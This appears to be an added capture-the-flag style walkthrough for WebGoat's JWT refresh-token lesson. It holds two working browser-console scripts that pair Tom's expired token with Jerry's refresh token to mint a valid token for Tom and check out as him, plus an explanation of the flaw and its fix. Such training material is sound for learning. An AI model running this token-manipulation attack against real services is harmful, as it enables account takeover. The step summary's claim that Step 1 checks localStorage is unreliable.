@@ -1,0 +1,204 @@
+╔═══════════════════════════════════════════════════════════╗
+║   JWT REFRESH TOKEN - COMPLETE SOLUTION                  ║
+║   Based on your actual WebGoat responses                 ║
+╚═══════════════════════════════════════════════════════════╝
+
+🎯 THE PROBLEM YOU DISCOVERED:
+
+Clicking "Checkout" sends Jerry's token:
+Authorization: Bearer eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0...
+
+Response: "User is not Tom but Jerry, please try again"
+
+WebGoat wants TOM to checkout, not Jerry!
+
+═══════════════════════════════════════════════════════════
+
+🚀 THE COMPLETE SOLUTION - 2 SCRIPTS
+
+SCRIPT 1: Find your refresh token
+SCRIPT 2: Execute the attack
+
+═══════════════════════════════════════════════════════════
+
+📍 STEP 1: FIND YOUR REFRESH TOKEN
+═══════════════════════════════════════════════════════════
+
+Open Console (F12) on the lesson page and paste this:
+
+// COPY EVERYTHING BELOW (including first line):
+// File: find_refresh_token.js
+
+(async function() {
+    console.clear();
+    console.log('%c🔍 SEARCHING FOR REFRESH TOKEN...', 'font-size: 18px; font-weight: bold; color: cyan');
+    const JERRY_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w';
+    console.log('\n[1] Checking HTML...');const html = document.documentElement.innerHTML;const patterns = [/refresh_token["']?\s*:\s*["']([^"']+)/gi,/refreshToken["']?\s*:\s*["']([^"']+)/gi,/"refresh_token":\s*"([^"]+)"/gi,/refresh_token=([a-zA-Z0-9\-_]+)/gi];let found = false;for (const pattern of patterns) {const matches = [...html.matchAll(pattern)];if (matches.length > 0) {console.log(`%c✓ Found!`, 'color: green; font-weight: bold');matches.forEach((match, i) => {const token = match[1];console.log(`  ${token}`);window.myRefreshToken = token;});found = true;break;}}if (!found) {console.log('%c✗ Not in HTML', 'color: orange');}console.log('\n[2] Trying server request...');try {const resp1 = await fetch('/WebGoat/JWT/refresh/newToken', {method: 'POST',headers: {'Authorization': 'Bearer ' + JERRY_TOKEN,'Content-Type': 'application/json'},body: JSON.stringify({})});console.log(`Response: ${resp1.status}`);const data1 = await resp1.json();console.log('Data:', data1);if (data1.refresh_token) {console.log('%c✓ Got refresh_token!', 'color: green; font-weight: bold');console.log(`  ${data1.refresh_token}`);window.myRefreshToken = data1.refresh_token;}} catch (e) {console.log('%c✗ Request failed:', 'color: red', e.message);}try {console.log('\n[3] Trying /refresh/login...');const resp2 = await fetch('/WebGoat/JWT/refresh/login', {method: 'POST',headers: {'Content-Type': 'application/json'},body: JSON.stringify({user: 'Jerry', password: 'x'})});console.log(`Response: ${resp2.status}`);if (resp2.ok) {const data2 = await resp2.json();if (data2.refresh_token) {console.log('%c✓ Got it!', 'color: green; font-weight: bold');console.log(`  ${data2.refresh_token}`);window.myRefreshToken = data2.refresh_token;}}} catch (e) {}console.log('\n═══════════════════════════════');if (window.myRefreshToken) {console.log('%c✅ REFRESH TOKEN FOUND!', 'color: white; background: green; font-size: 16px; font-weight: bold; padding: 5px');console.log('Token:', window.myRefreshToken);console.log('\n%c🚀 NOW RUN STEP 2 SCRIPT!', 'color: green; font-size: 14px; font-weight: bold');} else {console.log('%c⚠️ NOT FOUND - Check Network tab when clicking buttons', 'color: orange; font-size: 14px; font-weight: bold');console.log('Then: window.myRefreshToken = "paste_token_here"');}})();
+
+═══════════════════════════════════════════════════════════
+
+📍 STEP 2: EXECUTE THE ATTACK
+═══════════════════════════════════════════════════════════
+
+After STEP 1 finds your refresh token, paste this:
+
+// COPY EVERYTHING BELOW:
+
+(async function() {
+    const TOMS_EXPIRED_TOKEN = 'eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q';
+    const MY_REFRESH_TOKEN = window.myRefreshToken;
+    if (!MY_REFRESH_TOKEN) {console.error('❌ Run STEP 1 first to get refresh token!');return;}console.log('%c[1] Tom\'s expired token', 'color: cyan; font-weight: bold');console.log(JSON.parse(atob(TOMS_EXPIRED_TOKEN.split('.')[1])));console.log('%c[2] Your refresh token', 'color: cyan; font-weight: bold');console.log(MY_REFRESH_TOKEN.substring(0, 30) + '...');console.log('%c[3] ⚡ Executing refresh token manipulation...', 'color: red; font-weight: bold');const refreshResp = await fetch('/WebGoat/JWT/refresh/newToken', {method: 'POST',headers: {'Authorization': 'Bearer ' + TOMS_EXPIRED_TOKEN,'Content-Type': 'application/json'},body: JSON.stringify({refresh_token: MY_REFRESH_TOKEN})});if (!refreshResp.ok) {console.error('❌ Refresh failed:', refreshResp.status);const text = await refreshResp.text();console.log('Response:', text);return;}const refreshData = await refreshResp.json();const tomsNewToken = refreshData.access_token;console.log('%c✅ Got Tom\'s NEW token!', 'color: green; font-weight: bold; font-size: 16px');console.log('Token:', tomsNewToken);const decoded = JSON.parse(atob(tomsNewToken.split('.')[1]));console.log('Decoded:', decoded);console.log(`User: ${decoded.user} ${decoded.user === 'Tom' ? '✅' : '❌'}`);console.log('%c[4] 🛒 Checking out as Tom...', 'color: cyan; font-weight: bold');const checkoutResp = await fetch('/WebGoat/JWT/refresh/checkout', {method: 'POST',headers: {'Authorization': 'Bearer ' + tomsNewToken,'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8','X-Requested-With': 'XMLHttpRequest'}});const checkoutData = await checkoutResp.json();if (checkoutData.lessonCompleted) {console.log('%c🎉 SUCCESS! TOM PAID FOR THE BOOKS!', 'color: white; background: green; font-size: 20px; font-weight: bold; padding: 10px');console.log('Response:', checkoutData);} else {console.log('%c⚠️ Checkout response:', 'color: orange; font-weight: bold');console.log(checkoutData);if (checkoutData.feedback) {console.log('Feedback:', checkoutData.feedback);}}window.tomsNewToken = tomsNewToken;console.log('\n💡 Token saved to: window.tomsNewToken');})();
+
+═══════════════════════════════════════════════════════════
+
+🔄 IF YOU DON'T HAVE A REFRESH TOKEN YET
+═══════════════════════════════════════════════════════════
+
+The lesson page might require you to click a button first.
+
+Look for these on the page:
+- "Login" button
+- "Get Tokens" button  
+- "Initialize" button
+- "Start" button
+
+Click it, then check Network tab (F12 → Network) for the response.
+Look for "refresh_token" in the JSON response.
+
+Copy that value and run:
+window.myRefreshToken = "paste_your_refresh_token_here";
+
+Then run STEP 2 script above.
+
+═══════════════════════════════════════════════════════════
+
+📋 WHAT EACH STEP DOES
+═══════════════════════════════════════════════════════════
+
+STEP 1 Script:
+✓ Searches page HTML for refresh_token
+✓ Checks localStorage/sessionStorage
+✓ Tries to request token from server
+✓ Saves token to window.myRefreshToken
+
+STEP 2 Script:
+✓ Uses Tom's EXPIRED token (from log)
+✓ Uses YOUR refresh token (from Step 1)
+✓ Calls /JWT/refresh/newToken with both
+✓ Gets NEW valid token for Tom
+✓ Uses Tom's new token to checkout
+✓ Tom pays $31.53!
+
+═══════════════════════════════════════════════════════════
+
+🎯 THE VULNERABILITY EXPLAINED
+═══════════════════════════════════════════════════════════
+
+Authorization Server Bug:
+Server validates that refresh_token is valid ✅
+But doesn't check if it belongs to the user in access_token ❌
+
+Attack:
+POST /WebGoat/JWT/refresh/newToken
+Headers:
+  Authorization: Bearer <Tom's EXPIRED token>  ← user='Tom'
+Body:
+  {"refresh_token": "<Jerry's refresh token>"}  ← belongs to Jerry
+
+Server Logic:
+1. Validates refresh_token → It's valid ✅
+2. Issues new token for user in Authorization header
+3. Returns NEW token with user='Tom' ❌
+
+Result:
+We get a valid token for Tom using Jerry's refresh token!
+
+Fix:
+Server must check: access_token.user === refresh_token.user
+
+═══════════════════════════════════════════════════════════
+
+⚠️ TROUBLESHOOTING
+═══════════════════════════════════════════════════════════
+
+Error: "window.myRefreshToken is undefined"
+→ Run STEP 1 first, or manually set it
+
+Error: "User is not Tom but Jerry"
+→ The token still has user='Jerry'
+→ The refresh attack didn't work
+→ Check that you used Tom's expired token in Authorization header
+
+Error: 401 Unauthorized
+→ Refresh token might be expired
+→ Get a fresh one by clicking buttons on the page
+
+Error: "lessonCompleted: false"
+→ Check the feedback message
+→ Might need different token format
+→ Try decoding the token to verify user='Tom'
+
+═══════════════════════════════════════════════════════════
+
+📚 REFERENCE
+═══════════════════════════════════════════════════════════
+
+Original Bug Report:
+https://emtunc.org/blog/11/2017/jwt-refresh-token-manipulation/
+By: Mikail (Bugcrowd Private Program, November 2017)
+
+Key Quote:
+"The Authorization Server was not checking the refresh
+ token <-> access token association. This meant I could
+ refresh someone else's access token using my refresh token."
+
+Impact: HIGH
+- Account takeover possible
+- Access token expiration becomes meaningless
+- Very difficult to revoke
+
+WebGoat Lesson:
+Location: http://192.168.254.112:8001/WebGoat/JWT
+Lesson: "Refreshing a token"
+Challenge: Make Tom pay for the books ($31.53)
+
+Tom's Expired Token (from access log):
+eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE1MjYxMzE0MTEsImV4cCI6MTUyNjIxNzgxMSwiYWRtaW4iOiJmYWxzZSIsInVzZXIiOiJUb20ifQ.DCoaq9zQkyDH25EcVWKcdbyVfUL4c9D4jRvsqOqvi9iAd4QuqmKcchfbU8FNzeBNF9tLeFXHZLU4yRkq-bjm7Q
+
+Decoded:
+{
+  "iat": 1526131411,
+  "exp": 1526217811,
+  "admin": "false",
+  "user": "Tom"
+}
+
+Your Token (Jerry):
+eyJhbGciOiJIUzUxMiJ9.eyJ1c2VyIjoiSmVycnkiLCJhZG1pbiI6ImZhbHNlIn0.eaksrYMTQa-r_dqWEQL5nTRmzozm6A2qSjgpyyzKjnOLmvHSL0PI9rg_TrsA0QNKGnyBxNJwAvEO_us-satI1w
+
+Decoded:
+{
+  "user": "Jerry",
+  "admin": "false"
+}
+
+═══════════════════════════════════════════════════════════
+
+✅ SUCCESS CHECKLIST
+═══════════════════════════════════════════════════════════
+
+□ Step 1 script found refresh_token
+□ window.myRefreshToken is set
+□ Step 2 script got Tom's new token
+□ New token has user='Tom' (verified)
+□ Checkout responded with lessonCompleted: true
+□ WebGoat shows green checkmark
+□ Challenge complete! 🎉
+
+═══════════════════════════════════════════════════════════
+
+Tom's bank account: -$31.53 📉
+Your skill level: +100 🚀
+WebGoat JWT lessons: PWNED ✅
+
+═══════════════════════════════════════════════════════════
